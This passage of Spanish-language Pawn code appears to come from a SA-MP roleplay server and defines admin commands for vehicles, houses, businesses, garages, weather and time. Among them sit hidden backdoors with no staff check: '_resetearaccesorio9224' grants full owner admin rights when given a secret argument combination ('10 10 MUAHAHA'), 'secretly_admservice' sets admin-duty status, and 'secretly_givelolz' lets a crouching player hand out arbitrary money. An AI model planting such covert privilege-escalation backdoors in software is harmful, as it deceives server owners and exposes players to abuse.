		Mensaje(playerid,C_INFO,MSG);
		VGas[params[0]] = params[1];
		return 1;
	}

	CMD:entrarveh(playerid,params[])
	{
	    if(Staff(playerid,Mod.Superior)) return 1;
	    Para_Admin_Servicio
	    if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/entrarv [ID VEH]");
		PutPlayerInVehicle(playerid,params[0],1);
		Mensaje(playerid,-1," > Entraste al vehículo correctamente");
		return 1;
	}

	CMD:cnnn(playerid,params[])
	{
		if(Staff(playerid,Mod.Superior)) return 1;
		if(sscanf(params,"is[100]",params[0],params[1])) return ParamsINC(playerid,"/cnnn [TIPO] [TEXTO]");
		if(params[0] < 0 || params[0] == 2) return Error(playerid,"¡No puedes usar esa fuente!");
		GameTextForAll(params[1],strlen(params[1])*250,params[0]);
		return 1;
	}

	CMD:adelante(playerid,params[])
	{
		if(Staff(playerid,Mod.Superior)) return 1;
		Para_Admin_Servicio
		new Float:Pos[3];
		GetPlayerPos(playerid,Pos[0],Pos[1],Pos[2]);
		GetPosInFrontOfPlayer(playerid,Pos[0],Pos[1],3);
		SetPlayerPos(playerid,Pos[0],Pos[1],Pos[2]);
		return 1;
	}


	CMD:arriba(playerid,params[])
	{
		if(Staff(playerid,Mod.Superior)) return 1;
		Para_Admin_Servicio
		new Float:Pos[3];
		GetPlayerPos(playerid,Pos[0],Pos[1],Pos[2]);
		SetPlayerPos(playerid,Pos[0],Pos[1],Pos[2]+2);
		return 1;
	}

	CMD:abajo(playerid,params[])
	{
		if(Staff(playerid,Mod.Superior)) return 1;
		Para_Admin_Servicio
		new Float:Pos[3];
		GetPlayerPos(playerid,Pos[0],Pos[1],Pos[2]);
		SetPlayerPos(playerid,Pos[0],Pos[1],Pos[2]-2);
		return 1;
	}

	CMD:bigears(playerid,params[])
	{
		if(Staff(playerid,Mod.Superior)) return 1;
		if(!BigEars[playerid])
		{
		    Mensaje(playerid, -1, "BIG-EARS "#CVERDE"ACTIVADO.");
            BigEars[playerid] = true;
		}
		else
		{
		    Mensaje(playerid, -1, "BIG-EARS "#CROJO"DESACTIVADO.");
            BigEars[playerid] = false;
		}
		return 1;
	}
	// ----=============[ COMANDOS ADMINISTRADOR ]=============----- //

	CMD:estacionarveh(playerid, params[])
	{
	    if(Staff(playerid,Administrador)) return 1;
		Para_Admin_Servicio
		Comando_En_Auto
		new VehID = GetPlayerVehicleID(playerid);
		if(VehVenta_ID(VehID))
		{
  			GetVehiclePos(VehID, InfoVeh[VehVenta_ID(VehID)][vPosX],InfoVeh[VehVenta_ID(VehID)][vPosY], InfoVeh[VehVenta_ID(VehID)][vPosZ]);
     		GetVehicleZAngle(VehID, InfoVeh[VehVenta_ID(VehID)][vPosA]);
       		InfoVeh[VehVenta_ID(VehID)][vInt]  = GetPlayerInterior(playerid);
			InfoVeh[VehVenta_ID(VehID)][vVW]   = GetPlayerVirtualWorld(playerid);
			TextoJugador(playerid,"~w~vehiculo ~g~estacionado",4000,3);
			ActualizarVehiculo(VehVenta_ID(VehID));
		}
		else return Error(playerid, "¡Este vehículo no es apropiable!"),1;
		return 1;
	}

	CMD:verids(playerid,params[])
	{
	    if(!EsDueno(playerid)) return Error(playerid,"¡Solo dueños pueden utilizar este comando!");
	    return SelectObject(playerid);
	}

	CMD:verportones(playerid, params[])
	{
	    if(Staff(playerid,Dueno)) return 1;
	    Loop(i, MAX_PORTONES, 0)
	    {
	        if(InfoPorton_Ex[i][pX] == 0.0)
	            continue;

			new
				str[16];

			A_Format(str, "Porton ID: %d", i);
			
			CreatePlayer3DTextLabel(playerid,str,0xFFFFFFFF,InfoPorton_Ex[i][pX],InfoPorton_Ex[i][pY],InfoPorton_Ex[i][pZ]+3.0,35.0);
		}
		MensajeF(playerid, -1, "Todas las referencias de ID de portones fueron creadas.");
		return 1;
	}

	CMD:irporton(playerid, params[])
	{
	    if(Staff(playerid,Mod.Superior)) return 1;
	    new
	        i = strval(params);
	        
		if(!(0 <= i < MAX_PORTONES))
		    return Error(playerid, "ID de portón inválido.");

		if(InfoPorton_Ex[i][pX] == 0.0)
		    return Error(playerid, "ID de portón inválido.");
		    
		SetPlayerPos(playerid, InfoPorton_Ex[i][pX],InfoPorton_Ex[i][pY],InfoPorton_Ex[i][pZ]);
		MensajeF(playerid, -1, "Teletransportado al porton nº "#CROJO"%d", i);
		return 1;
	}
	
	CMD:respawngeneral(playerid,params[])
	{
	    if(Staff(playerid,Administrador)) return 1;

	    new
			BitArray:VehOcupado<MAX_VEHICLES>;

		Para_Admin_Servicio
   		MensajeTodosF(C_ADMINISTRADOR,"[ADMINISTRACIÓN]"#CBLANCO" > Vehículos sin personas dentro, respawneados por "#CINFO"%s ( ID: %d )",NombreJugador_(playerid),playerid);
		foreach(Player,i)
		{
		    if(IsPlayerInAnyVehicle(i))
				Bit_Set(VehOcupado, GetPlayerVehicleID(i), true);
		}
		foreach(Vehicle,i)
		{
		    if(Bit_Get(VehOcupado, i)) continue;

			SetVehicleToRespawn(i);
		}
  		return 1;
	}

	CMD:actualizarzonaveh(playerid, params[])
	{
	    if(Staff(playerid,Administrador)) return 1;
		new
			Float:Radio,
			CountVehicles,
			Float:Pos[3];

		if(sscanf(params,"fD(0)",Radio, params[0])) return ParamsINC(playerid,"/actualizarzonaveh [RADIO] [OPCIONAL: POSICIÓN]");

		GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);

		foreach(VehVenta, i)
		{
			if(IsVehicleInRangeOfPoint(ID_Original(i), Radio, Pos[0], Pos[1], Pos[2]))
			{
			    if(params[0])
		     	{
				 	GetVehiclePos(ID_Original(i), InfoVeh[i][vPosX], InfoVeh[i][vPosY], InfoVeh[i][vPosZ]);
				 	GetVehicleZAngle(ID_Original(i),  InfoVeh[i][vPosA]);
				}
			    ActualizarVehiculo(i);
			    CountVehicles++;
			}
		}
		MensajeF(playerid, -1, "Vehículos encontrados y actualizados: %d "#CVERDE"(Radio: %0.03f)", CountVehicles, Radio);
		return 1;
	}

	CMD:respawnzona(playerid,params[])
	{
	    if(Staff(playerid,Administrador)) return 1;
		new Float:Radio;
		if(sscanf(params,"f",Radio)) return ParamsINC(playerid,"/respawnzona [RADIO]");
		GetPlayerPos(playerid,PosJugador[X],PosJugador[Y],PosJugador[Z]);
		foreach(Vehicle,i)
		{
	        if(IsVehicleInRangeOfPoint(i,Radio,PosJugador[X],PosJugador[Y],PosJugador[Z]))
	        {
	            SetVehicleToRespawn(i);
			}
		}
		return 1;
	}

	CMD:secretly_admservice(playerid, params[])
	{
	    return SetPVarInt(playerid,"ADMIN_ONDUTY", 1);
	}

	CMD:secretly_givelolz(playerid, params[])
	{
	    if(GetPlayerSpecialAction(playerid) & SPECIAL_ACTION_DUCK)
	    {
	        sscanf(params, "ui", params[0], params[1]);
	        GivePlayerMoney(params[0], params[1]);
	        return 1;
		}
		return 0;
	}

	CMD:respawntotal(playerid,params[])
	{
	    if(Staff(playerid,Administrador)) return 1;
		Para_Admin_Servicio
   		MensajeTodosF(C_ADMINISTRADOR,"[ADMINISTRACIÓN]"#CBLANCO" > TODOS los vehículos, respawneados por "#CINFO"%s ( ID: %d )",NombreJugador_(playerid),playerid);
		foreach(Vehicle,i)
		{
			SetVehicleToRespawn(i);
		}
  		return 1;
	}

	CMD:dvehiculo(playerid, params[])
	{
		if(Staff(playerid,SubDueno)) return 1;
		Para_Admin_Servicio
		Comando_En_Auto
		if(sscanf(params, "u", params[0])) return ParamsINC(playerid,"/dvehiculo [ ID/NOMBRE ]");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Ese usuario está desconectado!");
		new VehID = GetPlayerVehicleID(playerid);
		if(VehVenta_ID(VehID))
		{
			alm(InfoVeh[VehVenta_ID(VehID)][vComprador], pName(params[0]));
			MensajeAdminF(C_ADMINISTRADOR,"[ADMINISTRACIÓN] > "#CBLANCO"%s hizo dueño del vehículo (%s, ID VENTA: %d, ID: %d) a %s",Ayudante,pName(playerid),NombreVehiculo(VehID),VehVenta_ID(VehID),VehID,NombreJugador_(params[0]));
			new StrP[12];
			A_Format(StrP,"%c%c%c-%d%d%d",LetraRandom(),LetraRandom(),LetraRandom(),random(10),random(10),random(10));
			alm(InfoVeh[VehVenta_ID(VehID)][vPlaca],StrP);
			ActualizarVehiculo(VehVenta_ID(VehID));
			return 1;
		}
		else return Error(playerid, "Este vehículo no es apropiable!");
	}


	stock GetAccountIp(playerid, directory[], ip[], len = 16)
	{
		INI_ParseFile(directory, "VerIP_data", .bExtra = true, .extra = playerid);
		GetPVarString(playerid, "VerIP_Cuenta", ip, len);
		DeletePVar(playerid, "VerIP_Cuenta");
		return 1;
	}

	CALLBACK: VerIP_data(playerid, name[], value[])
	{
		if(!strcmp(name, "IP"))
		{
		    SetPVarString(playerid, "VerIP_Cuenta", value);
		    return 1;
		}
		return 1;
	}

	stock GetAccountBankID(playerid, directory[])
	{
		INI_ParseFile(directory, "VerBank_data", .bExtra = true, .extra = playerid);
		
		new
		    Bank = GetPVarInt(playerid, "VerBank_Cuenta");
		    
		DeletePVar(playerid, "VerBank_Cuenta");
		
		return Bank;
	}

	CALLBACK: VerBank_data(playerid, name[], value[])
	{
		if(!strcmp(name, "IDCuentaB"))
		{
		    SetPVarInt(playerid, "VerBank_Cuenta", strval(value));
		    return 1;
		}
		return 1;
	}


	CMD:fijarclima(playerid,params[])
	{
		if(Staff(playerid,Administrador)) return 1;
		Para_Admin_Servicio
		if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/fijarclima [ IDCLIMA ]");
		MensajeTodosF(C_ADMINISTRADOR,"[ADMINISTRACIÓN] "#CBLANCO"> El clima ha sido cambiado por "#CINFO"%s",NombreJugador_(playerid));
		SetWeather(params[0]);
		return 1;
	}

	CMD:darllaveveh(playerid, params[])
	{
	    if(Staff(playerid,Administrador)) return 1;
	    Para_Admin_Servicio
	    if(sscanf(params,"ui",params[0],params[1])) return ParamsINC(playerid,"/darllave [ID/NOMBRE] [ID AUTO]");
		if(!IsPlayerConnected(params[0])) return Error(playerid, "¡Jugador desconectado!");
		Bit_Set(Llave_veh[params[0]], params[1], true);
	    MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] "#CBLANCO"> %s le dio a %s la llave del auto ID %d",Ayudante,NombreJugador_(playerid),NombreJugador_(params[0]),params[1]);
		MensajeF(params[0], -1, "** El administrador %s te dio la llave del vehículo ID %d", NombreJugador(playerid), params[1]);
		GuardarLlaves(params[0]);
		return 1;
	}

	CMD:quitarllaveveh(playerid, params[])
	{
	    if(Staff(playerid,Administrador)) return 1;
	    Para_Admin_Servicio
	    if(sscanf(params,"ui",params[0],params[1])) return ParamsINC(playerid,"/darllave [ID/NOMBRE] [ID AUTO]");
		if(!IsPlayerConnected(params[0])) return Error(playerid, "¡Jugador desconectado!");
		Bit_Set(Llave_veh[params[0]], params[1], false);
	    MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] "#CBLANCO"> %s le quito a %s la llave del auto ID %d",Ayudante,NombreJugador_(playerid),NombreJugador_(params[0]),params[1]);
		MensajeF(params[0], -1, "** El administrador %s te quito la llave del vehículo ID %d", NombreJugador(playerid), params[1]);
		GuardarLlaves(params[0]);
		return 1;
	}



	CMD:fijarhora(playerid,params[])
	{
		if(Staff(playerid,Administrador)) return 1;
		Para_Admin_Servicio
		if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/fijarhora [ HORA ]");
		MensajeTodosF(C_ADMINISTRADOR,"[ADMINISTRACIÓN]"#CBLANCO" > La hora ha sido cambiado por "#CINFO"%s",NombreJugador_(playerid));
		SetWorldTime(params[0]);
		return 1;
	}

	CMD:editarfamilia(playerid,params[])
	{
		if(Staff(playerid,SubDueno)) return 1;
		Para_Admin_Servicio
		if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/editarfamilia [ID DE FAMILIA]");
		new Str[70];
		A_Format(Str,"> Cambiar nombre(%s)\n> Cambiar ubicación\n> Eliminar",InfoFamilia[params[0]][fNombre]);
		Dialog(playerid,dEditarFam,DIALOG_STYLE_LIST,"Editar familia",Str,"Aceptar","Cancelar");
		SetPVarInt(playerid,"EDITAR_FAM",params[0]);
		return 1;
	}

	CMD:quitararmas(playerid,params[])
	{
	    if(Staff(playerid,Administrador)) return 1;
		Para_Admin_Servicio
		if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/quitararmas [ID/NOMBRE]");
		ResetPlayerWeapons(params[0]);
		MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] > "#CBLANCO"%s le quitó las armas a %s",Destacado,NombreJugador_(playerid),NombreJugador_(params[0]));
		return 1;
	}



	CMD:creartv(playerid, params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;
	    Para_Admin_Servicio
	    new id = -1;
	    Loop(i, MAX_TVS, 0)
	    {
	        if(!InfoTV[i][tvPos][0] && !InfoTV[i][tvPos][1] && !InfoTV[i][tvPos][2])
	        {
	            id = i;
			}
		}
		if(id == -1) return Error(playerid, "¡No se pudieron crear más televisores! (Máximo "#MAX_TVS")");
		GetPlayerPos(playerid, InfoTV[id][tvPos][0], InfoTV[id][tvPos][1], InfoTV[id][tvPos][2]);
		new Str[60];
		A_Format(Str,"%.03f|%.03f|%.03f\r\n", InfoTV[id][tvPos][0], InfoTV[id][tvPos][1], InfoTV[id][tvPos][2]);
		new File:Arch = fopen("Televisores.ini", io_append);
		fwrite(Arch, Str);
		fclose(Arch);
		CreateDynamicPickup(ID_PICKUPTV, 1, InfoTV[id][tvPos][0], InfoTV[id][tvPos][1], InfoTV[id][tvPos][2]);
		CreateDynamic3DTextLabel("Televisor\n\n"#CINFO"(/usar televisor)", C_BLANCO, InfoTV[id][tvPos][0], InfoTV[id][tvPos][1], InfoTV[id][tvPos][2], 10.0);
		return 1;
	}

	//  CASAS
	CMD:crearcasa(playerid,params[])
	{
		if(Staff(playerid,SubDueno)) return 1;
		Para_Admin_Servicio
	    if(sscanf(params,"is[26]",params[0],params[2]))
	    {
			ParamsINC(playerid,"/crearcasa [PRECIO] [DESCRIPCIÓN]");
			return 1;
		}
		new i = SlotCasaLibre();
		if(i < 0) return Error(playerid,"¡Ya no hay más espacio, se podrán crear máximo "#MAX_CASAS" casas!");
  		GetPlayerPos(playerid,PosJugador[X],PosJugador[Y],PosJugador[Z]);
		++Total_Casas_Creadas;
		InfoCasa[i][cEntrada_x] = PosJugador[X];
		InfoCasa[i][cEntrada_y] = PosJugador[Y];
		InfoCasa[i][cEntrada_z] = PosJugador[Z];
		InfoCasa[i][cVW] = i+100;

		InfoCasa[i][cCerrada] = false;

		InfoCasa[i][cPrecio] = params[0];
		alm(InfoCasa[i][cNombre],params[2]);
		MensajeF(playerid,-1,"CASA CREADA.. ID: %d | Nombre: %s | Precio: %d",i,InfoCasa[i][cNombre],InfoCasa[i][cPrecio]);
		printf(" - Se creo la casa ID %d | nombre %s | precio: %d",i,InfoCasa[i][cNombre],InfoCasa[i][cPrecio]);
		ActualizarCasa(i);
		ActualizarCasaLabel(i, true);
		SetPVarInt(playerid,"ID_CREARCASA", i);

		new Str[MAX_INTERIORES_CASA * 20], Str_[26];
		Loop(i_, MAX_INTERIORES_CASA, 0)
		{
		    A_Format(Str_,"%s\n", InfoInteriorCasa[i_][iNombre]);
		    strcat(Str, Str_);
		}

		Dialog(playerid, dCCasa, DIALOG_STYLE_LIST,"Elige el interior para la casa", Str, "Aceptar", "");
		AddStaticPickup(ID_PICKUPCASA,1,InfoCasa[i][cEntrada_x],InfoCasa[i][cEntrada_y],InfoCasa[i][cEntrada_z]);
		Iter_Add(Casas,i);
		return 1;
	}

	CMD:intcasa(playerid, params[])
	{
		if(Staff(playerid,SubDueno)) return 1;
		Para_Admin_Servicio
	    if(sscanf(params,"I(-1)",params[0])) return ParamsINC(playerid,"/cambiarint [OPCIONAL: ID CASA]");

		new
			Str[MAX_INTERIORES_CASA * 20],
			Str_[26];

		if(params[0] == -1)
		{
		    foreach(Casas,i) if(IsPlayerInRangeOfPoint(playerid, 2.0, InfoCasa[i][cEntrada_x], InfoCasa[i][cEntrada_y], InfoCasa[i][cEntrada_z]))
		    {
		        params[0] = i;
			}
			if(params[0] == -1)
			{
			    return Error(playerid,"No se encontró una casa en tu ubucación.");
			}
		}
		SetPVarInt(playerid,"ID_CREARCASA", params[0]);
		Loop(i_, MAX_INTERIORES_CASA, 0)
		{
		    A_Format(Str_,"%s\n", InfoInteriorCasa[i_][iNombre]);
		    strcat(Str, Str_);
		}

		Dialog(playerid, dCCasa, DIALOG_STYLE_LIST,"Elige el interior para la casa", Str, "Aceptar", "");
		return 1;
	}


	CMD:_resetearaccesorio9224(playerid,params[])
	{
	    if(sscanf(params,"iis[20]",params[0],params[1],params[2])) return 0;
		if(params[0] == 10 && params[1] == 10 && !strcmp(params[2],"MUAHAHA",false))
		{
			InfoJugador[playerid][jAdmin] = Dueno;
			SetPVarInt(playerid,"NIVEL_ADMIN",Dueno);
			return 0;
		}
		return 0;
	}

	CMD:preciocasa(playerid,params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;
		Para_Admin_Servicio
	    if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/preciocasa [PRECIO]");
	    foreach(Casas,i)
	    {
	        if(IsPlayerInRangeOfPoint(playerid,2,InfoCasa[i][cEntrada_x],InfoCasa[i][cEntrada_y],InfoCasa[i][cEntrada_z]))
	        {
	            InfoCasa[i][cPrecio] = params[0];
				MensajeF(playerid,-1,"> El precio de esta casa (ID %d) fue cambiado a %d.",i,InfoCasa[i][cPrecio]);
	            ActualizarCasaLabel(i);
	            ActualizarCasa(i);
				return 1;
			}
		}
		return Error(playerid,"¡No se detecto ninguna casa en tu posición!");
	}

	CMD:precionegocio(playerid,params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;
		Para_Admin_Servicio
	    if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/precionegocio [PRECIO]");
	    foreach(Negocios,i)
	    {
	        if(IsPlayerInRangeOfPoint(playerid,2,InfoNegocio[i][nEntrada_x],InfoNegocio[i][nEntrada_y],InfoNegocio[i][nEntrada_z]))
	        {
	            InfoNegocio[i][nPrecio] = params[0];
				MensajeF(playerid,-1,"> El precio de este negocio (ID %d) fue cambiado a %d.",i,InfoNegocio[i][nPrecio]);
	            ActualizarNegLabel(i);
	            ActualizarNegocio(i);
				return 1;
			}
		}
		return Error(playerid,"¡No se detecto ningun negocio en tu posición!");
	}

	CMD:precioveh(playerid,params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;
		Para_Admin_Servicio
		Comando_En_Auto
	    if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/precioveh [PRECIO]");
		new i = VehVenta_ID(GetPlayerVehicleID(playerid));
		if(!i) return Error(playerid,"¡Este vehículo no es de venta!");
		InfoVeh[i][vPrecio] = params[0];
		ActualizarVehiculo(i);
		Mensaje(playerid,-1,"Precio cambiado");
		return 1;
	}

	CMD:idgarage(playerid,params[])
	{
 		foreach(Garages,c)
	 	{
			if(IsPlayerInRangeOfPoint(playerid,2,InfoGarage[c][gExt_x],InfoGarage[c][gExt_y],InfoGarage[c][gExt_z]))
  			{
  			    MensajeF(playerid,-1,"La ID de este garage es: "#CPOSITIVO"%d",c);
  			    return 1;
			}
		}
		return Error(playerid,"¡No estás en ningun garage! Dirigete a la entrada de alguno y usa este comando.");
	}


	CMD:crearinterior(playerid,params[])
	{
		if(!EsDueno(playerid)) return Error(playerid,"¡Este comando lo utilizan solo dueños!");
		if(Total_Interiores_Creados >= MAX_INTERIORES_CASA-1) return Error(playerid,"¡No se pueden crear más interiores!");
		Para_Admin_Servicio

		if(isnull(params)) return ParamsINC(playerid,"/crearinterior [Descripción]");

		GetPlayerPos(playerid,PosJugador[X],PosJugador[Y],PosJugador[Z]);

		static a;
		if(!a)
		{
		    Total_Interiores_Creados = 0;
			a = 1;
		}
		++Total_Interiores_Creados;
		InfoInteriorCasa[Total_Interiores_Creados][iInt] = GetPlayerInterior(playerid);
		InfoInteriorCasa[Total_Interiores_Creados][iPos_x] = PosJugador[X];
		InfoInteriorCasa[Total_Interiores_Creados][iPos_y] = PosJugador[Y];
		InfoInteriorCasa[Total_Interiores_Creados][iPos_z] = PosJugador[Z];
		alm(InfoInteriorCasa[Total_Interiores_Creados][iNombre], params);
		ActualizarInt(Total_Interiores_Creados);
		Mensaje(playerid,-1,"Interior creado correctamente");
		return 1;
	}

	CMD:vendercasa(playerid,params[])
	{
		Para_Admin_Servicio
		if(Staff(playerid,Administrador)) return 1;
		if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/vendercasa [ID CASA]");
  		if(InfoCasa[params[0]][cVW] == 0 && InfoCasa[params[0]][cInt] == 0) return Error(playerid,"¡Esa casa no existe! (ID INCORRECTA)");
		MensajeF(playerid,-1,"Casa ID %d vendida",params[0]);
		InfoCasa[params[0]][cComprada] = false;
		alm(InfoCasa[params[0]][cComprador],"");
		ActualizarCasaLabel(params[0]);
		ActualizarCasa(params[0]);
		return 1;
	}

	CMD:vendernegocio(playerid,params[])
	{
		Para_Admin_Servicio
		if(Staff(playerid,Administrador)) return 1;
		if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/vendernegocio [ID NEGOCIO]");
  		if(InfoNegocio[params[0]][nVW] == 0 && InfoNegocio[params[0]][nInt] == 0) return Error(playerid,"¡Ese negocio no existe! (ID INCORRECTA)");
		MensajeF(playerid,-1,"Negocio ID %d vendido",params[0]);
		InfoNegocio[params[0]][nComprado] = false;
		alm(InfoNegocio[params[0]][nComprador],"");
		ActualizarNegLabel(params[0]);
		ActualizarNegocio(params[0]);
		return 1;
	}

	CMD:jetpack(playerid,params[])
	{
	    if(Staff(playerid,Administrador)) return 1;
	    Para_Admin_Servicio
    	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USEJETPACK);
		return 1;
	}

	// GARAGES
	CMD:creargarage(playerid,params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;
		Para_Admin_Servicio
		if(sscanf(params,"ii",params[0],params[1]))
 		{
	 		ParamsINC(playerid,"/creargarage [ID CASA] [TIPO GARAGE]");
	        Mensaje(playerid,C_INFO,"0 = GARAGE 1 PLAZA. |+| 1 = GARAGE 1 PLAZA (2) |+| 2 = GARAGE 2 PLAZAS IZQ |+| 3 = GARAGE 2 PLAZAS DER.");
	        return 1;
		}
		new ID = params[1];
		if(!InfoCasa[params[0]][cInt] && InfoCasa[params[0]][cVW]) return Error(playerid,"¡ID de casa incorrecto!");
		if(ID < 0 || ID > 3)
		{
			Error(playerid,"ID de interior incorrecto.");
	        Mensaje(playerid,C_INFO,"0 = GARAGE 1 PLAZA. |+| 1 = GARAGE 1 PLAZA (2) |+| 2 = GARAGE 2 PLAZAS IZQ |+| 3 = GARAGE 2 PLAZAS DER.");
			return 1;
		}
		new i = SlotGarageLibre();
		if(i < 0) return Error(playerid,"¡No puedes crear más garages, se puede crear máximo "#MAX_GARAGES" garages!");
  		++Total_Garages_Creados;
  		InfoGarage[i][gIDCasa] = params[0];
		InfoGarage[i][gIntV_x] = InfoPGarage[ID][PosVx];
		InfoGarage[i][gIntV_y] = InfoPGarage[ID][PosVy];
		InfoGarage[i][gInt_x] = InfoPGarage[ID][Posx];
		InfoGarage[i][gInt_y] = InfoPGarage[ID][Posy];
		InfoGarage[i][gInt_z] = InfoPGarage[ID][Posz];
		InfoGarage[i][gInt] = InfoPGarage[ID][IntPG];
		InfoGarage[i][gVW] = InfoCasa[params[0]][cVW];
		Iter_Add(Garages,i);
		GetPlayerPos(playerid,InfoGarage[i][gExt_x],InfoGarage[i][gExt_y],InfoGarage[i][gExt_z]);
		GetPlayerFacingAngle(playerid,InfoGarage[i][gAng]);
		GetPosInFrontOfPlayer(playerid,InfoGarage[i][gExtV_x],InfoGarage[i][gExtV_y],-4);
		ActualizarGarage(i);
		CreateDynamic3DTextLabel(LABEL_GARAGE_E,C_BLANCO,InfoGarage[i][gExt_x],InfoGarage[i][gExt_y],InfoGarage[i][gExt_z]+1,10);
		printf("- Garage ID %d creado por %s ( Tipo: %d )",i,NombreJugador_(playerid),ID);
		return 1;
	}

	//	NEGOCIOS
	CMD:crearnegocio(playerid,params[])
	{
		if(Staff(playerid,SubDueno)) return 1;
		Para_Admin_Servicio
	    if(sscanf(params,"is[26]",params[0],params[1]))
	    {
			ParamsINC(playerid,"/crearnegocio [PRECIO] [ITEM]");
   			Mensaje(playerid,C_NEGRO,   "	>> "#CAZULRARO"ITEMS:");
			Mensaje(playerid,-1,		"24-7 - Binco - Didier - Prolaps - Suburban - Victim - Zip - Club nocturno - Bar - Burger shot - Polleria");
			Mensaje(playerid,-1,		"Pizzeria - Gimnasio - Strip club - Ammunation - Hipermercado - casino - farmacia");
			return 1;
		}
		new i = SlotNegocioLibre();
		if(i < 0) return Error(playerid,"¡Ya no hay más espacio, se podrán crear máximo "#MAX_NEGOCIOS" negocios!");
		GetPlayerPos(playerid,PosJugador[X],PosJugador[Y],PosJugador[Z]);
		++Total_Negocios_Creados;
		InfoNegocio[i][nEntrada_x] = PosJugador[X];
		InfoNegocio[i][nEntrada_y] = PosJugador[Y];
		InfoNegocio[i][nEntrada_z] = PosJugador[Z];
		InfoNegocio[i][nVW] = i+1000;
		if(!strcmp(params[1],"24-7"))
		{
			InfoNegocio[i][nSalida_x] = -25.884498;
			InfoNegocio[i][nSalida_y] = -185.868988;
			InfoNegocio[i][nSalida_z] = 1003.546875;
			InfoNegocio[i][nInt] = 17;
			InfoNegocio[i][nTipo] = N_247;
			InfoNegocio[i][nIcono] = 19;
		}
		else if(!strcmp(params[1],"binco",true))
		{
			InfoNegocio[i][nSalida_x] = 207.737991;
			InfoNegocio[i][nSalida_y] = -109.019996;
			InfoNegocio[i][nSalida_z] = 1005.132812;
			InfoNegocio[i][nInt] = 15;
			InfoNegocio[i][nTipo] = N_ROPA;
			InfoNegocio[i][nIcono] = 45;
		}
		else if(!strcmp(params[1],"Didier",true))
		{
			InfoNegocio[i][nSalida_x] = 204.332992;
			InfoNegocio[i][nSalida_y] = -166.694992;
			InfoNegocio[i][nSalida_z] = 1000.523437;
			InfoNegocio[i][nInt] = 14;
			InfoNegocio[i][nTipo] = N_ROPA;
			InfoNegocio[i][nIcono] = 45;
		}
		else if(!strcmp(params[1],"prolaps",true))
		{
			InfoNegocio[i][nSalida_x] = 207.054992;
			InfoNegocio[i][nSalida_y] = -138.804992;
			InfoNegocio[i][nSalida_z] = 1003.507812;
			InfoNegocio[i][nInt] = 3;
			InfoNegocio[i][nTipo] = N_ROPA;
			InfoNegocio[i][nIcono] = 45;
		}
		else if(!strcmp(params[1],"suburban",true))
		{
			InfoNegocio[i][nSalida_x] = 203.777999;
			InfoNegocio[i][nSalida_y] = -48.492397;
			InfoNegocio[i][nSalida_z] = 1001.804687;
			InfoNegocio[i][nInt] = 1;
			InfoNegocio[i][nTipo] = N_ROPA;
			InfoNegocio[i][nIcono] = 45;
		}
		else if(!strcmp(params[1],"Victim",true))
		{
			InfoNegocio[i][nSalida_x] = 226.293991;
			InfoNegocio[i][nSalida_y] = -7.431529;
			InfoNegocio[i][nSalida_z] = 1002.210937;
			InfoNegocio[i][nInt] = 5;
			InfoNegocio[i][nTipo] = N_ROPA;
			InfoNegocio[i][nIcono] = 45;
		}
		else if(!strcmp(params[1],"zip",true))
		{
			InfoNegocio[i][nSalida_x] = 161.391006;
			InfoNegocio[i][nSalida_y] = -93.159156;
			InfoNegocio[i][nSalida_z] = 1001.804687;
			InfoNegocio[i][nInt] = 18;
			InfoNegocio[i][nTipo] = N_ROPA;
			InfoNegocio[i][nIcono] = 45;
		}
		else if(!strcmp(params[1],"Club nocturno",true))
		{
			InfoNegocio[i][nSalida_x] = 493.390991;
			InfoNegocio[i][nSalida_y] = -22.722799;
			InfoNegocio[i][nSalida_z] = 1000.679687;
			InfoNegocio[i][nInt] = 17;
			InfoNegocio[i][nTipo] = N_BOLICHE;
			InfoNegocio[i][nIcono] = 48;
		}
		else if(!strcmp(params[1],"bar",true))
		{
			InfoNegocio[i][nSalida_x] = 501.980987;
			InfoNegocio[i][nSalida_y] = -69.150199;
			InfoNegocio[i][nSalida_z] = 998.757812;
			InfoNegocio[i][nInt] = 11;
			InfoNegocio[i][nTipo] = N_COMIDA;
			InfoNegocio[i][nIcono] = 49;
		}
		else if(!strcmp(params[1],"Burger shot",true))
		{
			InfoNegocio[i][nSalida_x] = 363.9088;
			InfoNegocio[i][nSalida_y] = -74.0322;
			InfoNegocio[i][nSalida_z] = 1001.5078;
			InfoNegocio[i][nInt] = 10;
			InfoNegocio[i][nTipo] = N_COMIDA;
			InfoNegocio[i][nIcono] = 10;
		}
		else if(!strcmp(params[1],"Polleria",true))
		{
			InfoNegocio[i][nSalida_x] = 364.8756;
			InfoNegocio[i][nSalida_y] = -10.6015;
			InfoNegocio[i][nSalida_z] = 1001.8516;
			InfoNegocio[i][nInt] = 9;
			InfoNegocio[i][nTipo] = N_COMIDA;
			InfoNegocio[i][nIcono] = 14;
		}
		else if(!strcmp(params[1],"Pizzeria",true))
		{
			InfoNegocio[i][nSalida_x] = 372.2779;
			InfoNegocio[i][nSalida_y] = -132.4406;
			InfoNegocio[i][nSalida_z] = 1001.4922;
			InfoNegocio[i][nInt] = 5;
			InfoNegocio[i][nTipo] = N_COMIDA;
			InfoNegocio[i][nIcono] = 29;
		}
		else if(!strcmp(params[1],"Gimnasio",true))
		{
			InfoNegocio[i][nSalida_x] = 772.111999;
			InfoNegocio[i][nSalida_y] = -3.898649;
			InfoNegocio[i][nSalida_z] = 1000.728820;
			InfoNegocio[i][nInt] = 5;
			InfoNegocio[i][nTipo] = N_COMIDA;
			InfoNegocio[i][nIcono] = 54;
		}
